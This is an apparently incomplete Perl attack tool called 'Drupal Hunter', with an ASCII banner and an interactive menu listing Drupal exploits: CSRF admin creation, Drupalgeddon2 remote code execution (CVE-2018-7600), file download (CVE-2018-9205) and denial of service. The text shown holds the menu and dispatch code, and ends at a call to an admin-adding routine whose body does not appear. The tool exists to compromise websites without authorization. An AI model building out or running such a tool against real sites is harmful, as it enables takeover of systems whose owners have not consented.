#!/usr/bin/perl


use LWP::Simple;
use LWP::UserAgent;
use Term::ANSIColor;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);


system(($^O eq 'MSWin32') ? 'cls' : 'clear');
system(($^O eq 'MSWin32') ? 'mode con:cols=100 lines=40' : 'resize -s 40 100');
my $now_string = localtime();


print "                       ug                                                \n";
print "                       b                                                 \n";
print "                      g           bug       ____                  _      \n";
print "                      u        bug         |    \  ___ _ _ ___ ___| |     \n";
print "      bugbug          b       g            |  |  |  _| | | . | .'| |     \n";  
print "            bug      bugbug bu             |____/|_| |___|  _|__,|_|     \n";
print "               bug  bugbugbugbugbugbug                   |_|             \n";
print "  bug   bug   bugbugbugbugbugbugbugbugb       _____         _            \n";
print "     bug   bug bugbugbugbugbugbugbugbugbu    |  |  |_ _ ___| |_ ___ ___  \n";
print "   bugbugbugbu gbugbugbugbugbugbugbugbugbu   |     | | |   |  _| -_|  _| \n";
print "  bugbugbugbug                               |__|__|___|_|_|_| |___|_|   \n";
print "   bugbugbugbu gbugbugbugbugbugbugbugbugbu                               \n";
print "     bug   bug bugbugbugbugbugbugbugbugbu                                \n";
print "  bug   bug  gbugbugbugbugbugbugbugbugb         V 1.0 By dr-iman         \n";      
print "               bug  bugbugbugbugbugbug               GIST                \n";           
print "            bug      bugbug  bu                                          \n";            
print "      bugbug          b        g                                         \n";
print "                      u         bug     Time & Date : $now_string        \n";
print "                      g            bug                                   \n";
print "                       b                                                 \n";
print "                        ug                                               \n";
print "\n[";print colored("--h (Help , how to use the tool) ", 'red'),;print "]\n";
print "\nHunter > ";
$exploit=<>;
chomp($exploit);

if ($exploit eq "--h" or $exploit eq "help" or $exploit eq "--H" or $exploit eq "Help")
{
print <<help;
Exploit Title                        Description                     Command
Drupal Add New Admin                 You Can Add New Admin           drupal-csrf/add-new-admin
Drupal 'Drupalgeddon2'               Remoce Command Execution        drupal-rce/geddon-rce
7.54/.../8.5.1 RCE                   (CVE-2018-7600)
Drupal Avatar Uploader               Download important files        drupal-afd/avatar-afd
7.x-1.0-beta8 AFD                    (CVE-2018-9205)			 									 
Drupal 5.21/6.16 DOS                 0day dos issue for drupal       drupal-dos/2009-dos
Drupal 7.12 CSRF                     You Can Add new admin           drupal-csrf/2012-csrf
Add New Admin 
help
print "\nBack To list or No(Y or N) : ";
my $let=<>;
chomp($let);
if ($let eq "y" or $let eq "Y")
{
system ("perl hunter.pl");
}
elsif ($let eq "n" or $let eq "N")
{
system "";
}
}

elsif($exploit eq "drupal-csrf/add-new-admin" or $exploit eq "DRUPAL-CSRF/ADD-NEW-ADMIN")
{
addnewadmin();
}

